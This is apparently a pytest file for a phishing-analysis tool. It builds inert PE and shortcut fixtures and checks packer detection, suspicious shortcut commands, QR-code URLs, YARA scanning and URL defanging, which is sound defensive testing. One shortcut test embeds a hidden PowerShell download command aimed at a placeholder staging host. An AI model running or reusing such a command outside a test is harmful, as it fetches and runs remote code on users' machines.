"""Tests for phishlens.analyzers.binaries. The PE and LNK files are built in the test from
headers and random bytes: they contain no code and cannot run."""

from __future__ import annotations

import os
import struct
from pathlib import Path

import pytest

from phishlens.analyzers import binaries, qr
from phishlens.analyzers.binaries import (
    analyze_image,
    analyze_lnk,
    analyze_pe,
    defang_text,
    yara_scan,
)
from phishlens.config import get_settings

FIXTURES = Path(__file__).parent / "fixtures"
MARKER = b"PHISHLENS-YARA-TEST-MARKER"


def make_pe(section: bytes = b".text", data: bytes = b"\0" * 512, timestamp: int = 1700000000):
    """A minimal PE32 image: headers and one section of ``data``. No code, no imports."""
    dos = b"MZ" + b"\0" * 58 + struct.pack("<I", 0x40)
    file_header = struct.pack("<HHIIIHH", 0x14C, 1, timestamp, 0, 0, 0xE0, 0x0102)
    optional = struct.pack(
        "<HBBIIIIIIIIIHHHHHHIIIIHHIIIIII",
        0x10B, 14, 0, 512, 0, 0, 0x1000, 0x1000, 0x2000, 0x400000, 0x1000, 0x200,
        6, 0, 0, 0, 6, 0, 0, 0x2000, 0x200, 0, 2, 0, 0x100000, 0x1000, 0x100000, 0x1000, 0, 16,
    ) + b"\0" * (16 * 8)
    table = struct.pack(
        "<8sIIIIIIHHI", section.ljust(8, b"\0"), len(data), 0x1000, len(data), 0x200,
        0, 0, 0, 0, 0x60000020,
    )
    return (dos + b"PE\0\0" + file_header + optional + table).ljust(0x200, b"\0") + data


def make_lnk(relative_path: str, arguments: str) -> bytes:
    """A minimal shell link with a relative path and arguments (Unicode strings)."""
    flags = 0x08 | 0x20 | 0x80  # HasRelativePath | HasArguments | IsUnicode
    header = struct.pack(
        "<I16sII", 0x4C, bytes.fromhex("0114020000000000c000000000000046"), flags, 0
    ).ljust(0x4C, b"\0")

    def string(text: str) -> bytes:
        return struct.pack("<H", len(text)) + text.encode("utf-16-le")

    return header + string(relative_path) + string(arguments)


def _flags(report) -> dict:
    return dict(report.flags)


# --- PE ------------------------------------------------------------------------------------------


def test_plain_pe() -> None:
    report = analyze_pe(make_pe())
    flags = _flags(report)
    assert flags["pe_executable_attachment"]["signature_present"] is False
    assert flags["pe_executable_attachment"]["unusual_compile_time"] is False
    assert "pe_packed" not in flags
    assert report.info["sections"] == [{"name": ".text", "entropy": 0.0, "size": 512}]


def test_packed_pe_by_section_name_and_entropy() -> None:
    report = analyze_pe(make_pe(b"UPX0", os.urandom(4096)))
    packed = _flags(report)["pe_packed"]
    assert packed == {"packer_sections": ["UPX0"], "high_entropy_sections": ["UPX0"]}


def test_unusual_compile_time() -> None:
    old = analyze_pe(make_pe(timestamp=0))
    future = analyze_pe(make_pe(timestamp=4102444800))  # 2100-01-01
    assert _flags(old)["pe_executable_attachment"]["unusual_compile_time"] is True
    assert _flags(future)["pe_executable_attachment"]["unusual_compile_time"] is True


def test_invalid_pe_is_not_flagged() -> None:
    report = analyze_pe(b"MZ this is not really a program")
    assert report.flags == [] and report.info["valid_pe"] is False


# --- LNK -----------------------------------------------------------------------------------------


def test_lnk_powershell_is_flagged() -> None:
    report = analyze_lnk(
        make_lnk(
            r"..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "-nop -w hidden -c iwr https://stage.example.test/p.ps1",
        )
    )
    flagged = _flags(report)["lnk_suspicious_command"]
    assert {"powershell", "https://"} <= set(flagged["indicators"])
    assert "hxxps://stage[.]example[.]test/p.ps1" in flagged["arguments"]
    assert report.urls == ["https://stage.example.test/p.ps1"]


def test_lnk_remote_path_is_flagged() -> None:
    report = analyze_lnk(make_lnk(r"\\files.example.test\share\invoice.exe", ""))
    assert _flags(report)["lnk_suspicious_command"]["indicators"] == ["\\\\"]


def test_harmless_lnk() -> None:
    report = analyze_lnk(make_lnk(r"..\Documents\report.docx", ""))
    assert report.flags == [] and report.info["target"] == r"..\Documents\report.docx"


def test_broken_lnk() -> None:
    assert analyze_lnk(b"L\0\0\0 not a shortcut").flags == []


# --- Images and QR ------------------------------------------------------------------------------


def test_image_without_zbar_records_it(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(binaries, "qr_available", lambda: False)
    report = analyze_image(b"\x89PNG\r\n\x1a\n")
    assert report.info == {"qr_decoding": "unavailable (zbar not installed)"}


def test_image_qr_with_mocked_decoder(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(binaries, "qr_available", lambda: True)
    monkeypatch.setattr(
        binaries, "decode_qr", lambda data: ["https://quish.example.test/login", "WIFI:S:x;;"]
    )
    report = analyze_image(b"image bytes")
    assert report.qr_urls == ["https://quish.example.test/login"]
    assert _flags(report)["qr_code_url"] == {
        "urls": ["hxxps://quish[.]example[.]test/login"],
        "other_texts": ["WIFI:S:x;;"],
    }


@pytest.mark.skipif(not qr.qr_available(), reason="zbar not installed (docs/SETUP_NOTES.md)")
def test_fixture_12_qr_image() -> None:
    from phishlens.parser import parse_email

    email = parse_email((FIXTURES / "qr_code.eml").read_bytes())
    report = analyze_image(email.inline_images[0].data)
    assert report.qr_urls and report.qr_urls[0].startswith("http")


# --- YARA ----------------------------------------------------------------------------------------


@pytest.fixture(autouse=True)
def fresh_yara():
    binaries.clear_yara_cache()
    yield
    binaries.clear_yara_cache()


def test_example_rule_matches_marker() -> None:
    matches, errors = yara_scan(b"harmless text " + MARKER + b" more text")
    assert errors == []
    assert [(m["rule"], m["severity"]) for m in matches] == [("PhishLens_Test_Marker", "medium")]
    assert yara_scan(b"nothing here") == ([], [])


def test_bad_rule_file_is_skipped(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    (tmp_path / "good.yar").write_text(
        'rule Good { meta: severity = "critical" strings: $a = "GOODMARK" condition: $a }'
    )
    (tmp_path / "bad.yara").write_text("rule Broken { condition: nonsense_here }")
    (tmp_path / "notes.txt").write_text("not a rule")
    monkeypatch.setenv("YARA_RULES_DIR", str(tmp_path))
    get_settings.cache_clear()
    matches, errors = yara_scan(b"xx GOODMARK xx")
    assert [(m["rule"], m["severity"]) for m in matches] == [("Good", "critical")]
    assert len(errors) == 1 and errors[0].startswith("yara: bad.yara:")


def test_no_rules_folder(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    monkeypatch.setenv("YARA_RULES_DIR", str(tmp_path / "missing"))
    get_settings.cache_clear()
    assert yara_scan(MARKER) == ([], [])


def test_defang_text() -> None:
    assert defang_text("run https://a.example.test/x now") == "run hxxps://a[.]example[.]test/x now"
